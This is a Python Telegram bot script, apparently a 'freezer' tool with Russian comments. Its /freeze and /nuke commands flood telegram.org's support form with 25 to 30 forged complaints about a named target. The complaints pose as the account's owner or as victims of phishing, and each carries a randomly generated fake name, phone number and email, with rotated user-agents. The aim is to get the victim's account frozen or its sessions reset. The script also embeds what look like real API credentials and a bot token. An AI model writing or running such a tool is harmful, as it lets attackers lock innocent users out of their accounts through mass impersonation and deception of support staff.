import asyncio
import aiohttp
import random
import logging
from telethon import TelegramClient, events

API_ID = 39875871
API_HASH = '194a27a63519b6f5e12551fad0038e95'
BOT_TOKEN = '8698922231:AAFnAa4L4cAMutQBSelPv1pDLXTQvqic670'
ADMIN_ID = 5134284689

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('freezer')

bot = TelegramClient('freezer_bot', API_ID, API_HASH)

UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/134.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 Chrome/135.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1",
]

PHONE_CODES = ['7916','7926','7903','7910','7920','7905','7909','7985','7915','7925',
               '7937','7958','7960','7963','7965','7967','7968','7977','7980','7982']

EMAIL_DOMAINS = ['gmail.com','yahoo.com','outlook.com','proton.me','mail.ru','yandex.ru',
                 'rambler.ru','bk.ru','inbox.ru','icloud.com','hotmail.com']

NAMES = [
    "James Wilson","Michael Brown","David Johnson","Robert Martinez",
    "Thomas Anderson","William Taylor","Daniel Harris","Christopher White",
    "Алексей Иванов","Дмитрий Петров","Сергей Смирнов","Андрей Кузнецов",
    "Максим Васильев","Иван Попов","Егор Соколов","Никита Морозов",
    "Артём Волков","Владимир Новиков","Павел Фёдоров","Антон Михайлов"
]

# ==================== ТЕКСТЫ ДЛЯ ЗАМОРОЗКИ ====================
FREEZE_COMPLAINTS = [
    # Жалобы от "владельца" — аккаунт взломан, просит заморозить
    "URGENT: My account @{u} (ID: {id}) has been hacked. The attacker is currently active and sending messages to my contacts. Please FREEZE my account immediately to prevent further damage. I am the real owner. My phone: +{p}. I can verify my identity. Please freeze until I recover access.",
    
    "Hello Telegram support, I am the owner of @{u} (ID: {id}). My account was compromised. Someone else is using it right now. Please temporarily freeze my account so the hacker cannot use it. I will verify my identity with my phone number +{p}. This is urgent.",
    
    "Dear support, I need my account @{u} (ID: {id}) to be frozen immediately. I clicked a phishing link and now a stranger has access. They are messaging my friends and colleagues. My phone: +{p}. Please freeze the account and I will provide any verification needed.",
    
    "ACCOUNT COMPROMISED: @{u} (ID: {id}). I am the legitimate owner. Someone gained unauthorized access. Please freeze this account now. Phone for verification: +{p}. I can prove ownership through SMS or email.",
    
    "Dear Telegram team, my account @{u} (ID: {id}) is currently under control of a hacker. I lost access after clicking a malicious link. Please freeze the account temporarily. My number: +{p}. I am ready to verify. Thank you.",
    
    # Жалобы от "других людей" — аккаунт ведёт себя подозрительно
    "Suspicious activity report: Account @{u} (ID: {id}) is sending phishing links to multiple users. This account appears to be compromised or is a scam account. Please investigate and freeze if necessary. Reported by phone: +{p}.",
    
    "I want to report account @{u} (ID: {id}) for unusual behavior. It is mass-messaging users with suspicious links. This account seems hacked. Please freeze it to protect other users. My phone: +{p}.",
    
    "Hello, I received strange messages from @{u} (ID: {id}). The account is sending links and asking for money. It looks like a hacked account or a scammer. Please freeze this account. Reporter phone: +{p}.",
    
    "Report: @{u} (ID: {id}) is behaving like a compromised account. Sending spam and phishing links. Multiple people received these messages. Please freeze for investigation. Phone: +{p}.",
    
    "Account @{u} (ID: {id}) is sending unsolicited and suspicious messages. Appears to be stolen. Please freeze the account to prevent harm. My contact: +{p}. Thank you.",
    
    # Русские тексты
    "СРОЧНО: Мой аккаунт @{u} (ID: {id}) взломали. Злоумышленник сейчас активен и пишет моим контактам. Пожалуйста, ЗАМОРОЗЬТЕ аккаунт немедленно. Я настоящий владелец. Телефон: +{p}. Готов подтвердить личность.",
    
    "Здравствуйте, я владелец @{u} (ID: {id}). Мой аккаунт скомпрометирован. Кто-то другой использует его прямо сейчас. Прошу временно заморозить аккаунт. Мой номер: +{p}. Могу верифицироваться.",
    
    "Поддержка Telegram, прошу заморозить аккаунт @{u} (ID: {id}). Я перешёл по фишинговой ссылке и теперь посторонний имеет доступ. Пишет моим друзьям. Телефон: +{p}. Заморозьте и я подтвержу личность.",
    
    "АККАУНТ ВЗЛОМАН: @{u} (ID: {id}). Я законный владелец. Кто-то получил несанкционированный доступ. Заморозьте аккаунт сейчас. Телефон для верификации: +{p}.",
    
    "Команда Telegram, мой аккаунт @{u} (ID: {id}) под контролем хакера. Потерял доступ после перехода по ссылке. Заморозьте временно. Номер: +{p}. Готов верифицироваться.",
    
    "Жалоба на подозрительную активность: @{u} (ID: {id}) рассылает фишинговые ссылки. Аккаунт похоже взломан. Заморозьте для проверки. Телефон: +{p}.",
    
    "Сообщаю о странном поведении @{u} (ID: {id}). Массовая рассылка подозрительных ссылок. Аккаунт взломан. Заморозьте для защиты пользователей. Мой телефон: +{p}.",
    
    "Здравствуйте, получил странные сообщения от @{u} (ID: {id}). Аккаунт присылает ссылки и просит деньги. Похоже на взлом. Заморозьте. Номер: +{p}.",
    
    "Репорт: @{u} (ID: {id}) ведёт себя как скомпрометированный аккаунт. Спам и фишинг. Прошу заморозить. Телефон: +{p}.",
    
    "Аккаунт @{u} (ID: {id}) рассылает нежелательные сообщения. Похоже украден. Заморозьте для предотвращения вреда. Контакт: +{p}.",
]

async def send_freeze_form(target, tid):
    phone = f"+7{random.choice(PHONE_CODES)}{random.randint(1000000, 9999999)}"
    name = random.choice(NAMES)
    email = f"{name.lower().replace(' ', '.')}{random.randint(10, 9999)}@{random.choice(EMAIL_DOMAINS)}"
    body = random.choice(FREEZE_COMPLAINTS).format(u=target, id=tid, p=phone)
    
    headers = {
        "User-Agent": random.choice(UA),
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://telegram.org",
        "Referer": "https://telegram.org/support"
    }
    
    data = {
        "problem": body,
        "email": email,
        "phone": phone,
        "username": f"@{target}",
        "type": "hacked_account"
    }
    
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(
                "https://telegram.org/support",
                headers=headers,
                data=data,
                timeout=aiohttp.ClientTimeout(total=15)
            ) as r:
                logger.info(f"[{r.status}] @{target}")
                return r.status == 200
    except Exception as e:
        logger.error(f"ERR: {e}")
        return False

async def freeze(target, tid, event):
    target = target.replace('@', '')
    await event.reply(f"❄️ ЗАМОРОЗКА @{target}\nID: {tid}\n⚡ 25 запросов...")
    
    ok = 0
    for i in range(25):
        if await send_freeze_form(target, tid):
            ok += 1
        await asyncio.sleep(random.uniform(2, 5))
        if (i + 1) % 5 == 0:
            await event.reply(f"📊 [{i+1}/25] +{ok}")
    
    await event.reply(
        f"❄️ ГОТОВО\n"
        f"👤 @{target}\n"
        f"📊 {ok}/25 жалоб отправлено\n"
        f"⚠ Заморозка: 1-6 часов\n"
        f"💡 Повтори через 4 часа если не сработало"
    )

@bot.on(events.NewMessage(pattern='/start'))
async def cmd_start(event):
    if event.sender_id != ADMIN_ID:
        return
    await event.reply("❄️ FREEZER\n/freeze @user ID — заморозка аккаунта\n/nuke @user ID — сброс сессий")

@bot.on(events.NewMessage(pattern='/freeze'))
async def cmd_freeze(event):
    if event.sender_id != ADMIN_ID:
        return
    a = event.text.split()
    if len(a) < 3:
        await event.reply("/freeze @user ID")
        return
    t = a[1] if a[1].startswith('@') else f"@{a[1]}"
    asyncio.ensure_future(freeze(t, a[2], event))

@bot.on(events.NewMessage(pattern='/nuke'))
async def cmd_nuke(event):
    if event.sender_id != ADMIN_ID:
        return
    a = event.text.split()
    if len(a) < 3:
        await event.reply("/nuke @user ID")
        return
    t = a[1] if a[1].startswith('@') else f"@{a[1]}"
    tid = a[2]
    target = t.replace('@', '')
    await event.reply(f"💣 СБРОС СЕССИЙ @{target}\nID: {tid}\n⚡ 30 запросов...")
    
    ok = 0
    for i in range(30):
        phone = f"+7{random.choice(PHONE_CODES)}{random.randint(1000000, 9999999)}"
        name = random.choice(NAMES)
        email = f"{name.lower().replace(' ', '.')}{random.randint(10, 9999)}@{random.choice(EMAIL_DOMAINS)}"
        
        body = (
            f"Hello dear Telegram support, I got caught on a phishing link and scammers "
            f"are throwing out my Telegram account sessions, please complete all available "
            f"sessions that are on the account. Thank you in advance for your help. "
            f"username - @{target} id - {tid} number - +{phone}"
        )
        
        headers = {
            "User-Agent": random.choice(UA),
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://telegram.org",
            "Referer": "https://telegram.org/support"
        }
        
        data = {
            "problem": body,
            "email": email,
            "phone": phone,
            "username": f"@{target}",
            "type": "hacked_account"
        }
        
        try:
            async with aiohttp.ClientSession() as s:
                async with s.post(
                    "https://telegram.org/support",
                    headers=headers,
                    data=data,
                    timeout=aiohttp.ClientTimeout(total=15)
                ) as r:
                    if r.status == 200:
                        ok += 1
                    logger.info(f"[{r.status}] @{target}")
        except Exception as e:
            logger.error(f"ERR: {e}")
        
        await asyncio.sleep(random.uniform(1.5, 3))
        if (i + 1) % 10 == 0:
            await event.reply(f"📊 [{i+1}/30] +{ok}")
    
    await event.reply(f"✅ ГОТОВО\n👤 @{target}\n📊 {ok}/30\n⚠ Ответ: 12-48ч")

async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"❄️ Бот @{me.username} готов")
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.run(main())
